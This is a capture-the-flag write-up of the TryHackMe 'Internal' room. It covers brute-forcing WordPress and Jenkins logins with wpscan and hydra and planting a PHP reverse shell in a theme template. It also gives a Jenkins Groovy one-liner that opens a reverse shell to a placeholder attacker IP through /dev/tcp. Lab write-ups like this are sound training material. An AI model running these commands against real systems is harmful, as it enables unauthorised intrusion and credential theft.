---
title: "TryHackMe Internal"
categories: [TryHackMe]
tags: [linux, web, wordpress, docker, jenkins]
media_subpath: /images/tryhackme_internal
image: 
  path: room-image.jpeg
---

Room link: [https://tryhackme.com/room/internal](https://tryhackme.com/room/internal)

Firstly, add `internal.thm` to /etc/hosts

![etc-hosts](etc-hosts.png)

## Initial scan

![port-scan](port-scan.png)

2 open ports:
 - 22 \| SSH
 - 80 \| HTTP

## Enumeration

Enumerating web directories using gobuster. (Also ran gobuster to check subdomains but it didn't find
anything)

![gobuster-main-domain](gobuster-main-domain.png)

Tried accessing `/phpmyadmin` using foolowing credentials but no luck, let's move on and run gobuster on `/blog`.
 - admin:admin
 - root:\<blank\>
 - root:root

![gobuster-blog](gobuster-blog.png)

## Initial Entry

While wpscan was running, looking at wordpress page there were no useful information.

```console
wpscan --url http://internal.thm/blog -e ap,u,tt,vt
```

![wpscan-admin-enum](wpscan-admin-enum.png)

Wpscan found `admin` user, we can bruteforce it using following command where `users.txt` contains admin username

```console
wpscan --url http://internal.thm/blog -U users.txt --passwords /usr/share/wordlists/rockyou.txt
```

We got password, let's login on `/blog/wp-login.php`

![wpscan-admin-pass](wpscan-admin-pass.png)

While digging in wp dashboard in (no title) posts we can found credentials for user william, tried to log in to ssh using those credentials but no luck.

![wordpress-posts](wordpress-posts.png)

![wordpress-notitle](wordpress-notitle.png)

We can try to catch reverse shell using edit theme. Choose 404 Template and paste pentestmonkey php reverse shell [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![php-revshell](php-revshell.png)

Save modifications and access `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`

![www-data-shell](www-data-shell.png)

Stabilizing shell

![www-data-stabilizing-shell](www-data-stabilizing-shell.png)

Don't forget to check `/var/www/html/wordpress/wp-config.php`. Usually there DB credentials. But it wasn't so useful, the only user there was is admin and we know credentials

While enumerating there's only 1 `/home` user in this system. And also luckily for us there's credentials for this user in `/opt` directory!

Also we can grab `user.txt` flag in aubreanna's home directory

![aubreanna-enum](aubreanna-enum.png)

### **_user.txt Flag_**

![aubreanna-pass-and-flag](aubreanna-pass-and-flag.png)

## Privilege Escalation

Note says Jenkins service runs on port 8080. We can confirm that running `netstat -tln`

![jenkins-txt](jenkins-txt.png)

![netstat1](netstat1.png)

(And by the way we can switch to ssh since we have password for aubreanna)

![aubreanna-ssh-access](aubreanna-ssh-access.png)

We can forward port 8080 to out attacker's machine. 

```console
ssh -L <our_port>:127.0.0.1:<targets_port> username@ip
```

```console
ssh -L 8080:127.0.0.1:8080 aubreanna@internal.thm -fN
```

 - `-f` backgrounds the shell immediately so that we have our own terminal back
 - `-N` tells SSH that it doesn't need to execute any commands - only set up the connection.

If everything done correctly you should be able to access website on your machine at `127.0.0.1:8080`

![jenkins-website](jenkins-website.png)

Tried to login using credentials like `admin:admin`, `admin:password` etc. Also tried credentials for users: admin, william and aubreanna but none of them worked

Next what we could try is bruteforcing. If you try to login with dummy credentials we can see POST request sends to `/j_acegi_security_check`

![post-request](post-request.png)

Successfully got password using `hydra`

```console
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=/&Submit=Sign+in:F=Invalid username or password'
```

![jenking-hydra-brute](jenking-hydra-brute.png)

After logging in website greets us with Welcome page

![jenkins-welcome-page](jenkins-welcome-page.png)


Found this -> [https://exploit-notes.hdks.org/exploit/web/jenkins-pentesting/](https://exploit-notes.hdks.org/exploit/web/jenkins-pentesting/)

Following that we can catch reverse shell

1) Navigate to `/manage` directory or just click on `Manage Jenkins` on the left side of the page and click on `Script Console` at the bottom

![jenkins-manage](jenkins-manage.png)

2) Set up listener and paste following code for reverse shell and click `Run`:

```console
r = Runtime.getRuntime()
p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/<Attacker_IP>/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

![jenkins-script-console](jenkins-script-console.png)

After catching shell, it appears that we are in docker conatiner

We have no sudo here, however if you navigate to `/opt` directory you will find root's credentials

(Dont forget to kill ssh process with port forwarding)

![kill-ssh-process](kill-ssh-process.png)

Now go back to our non-docker shell (where is audrianna user) and switch to root. Now we can grab `root.txt`

### **_root.txt Flag_**

![root-flag](root-flag.png)
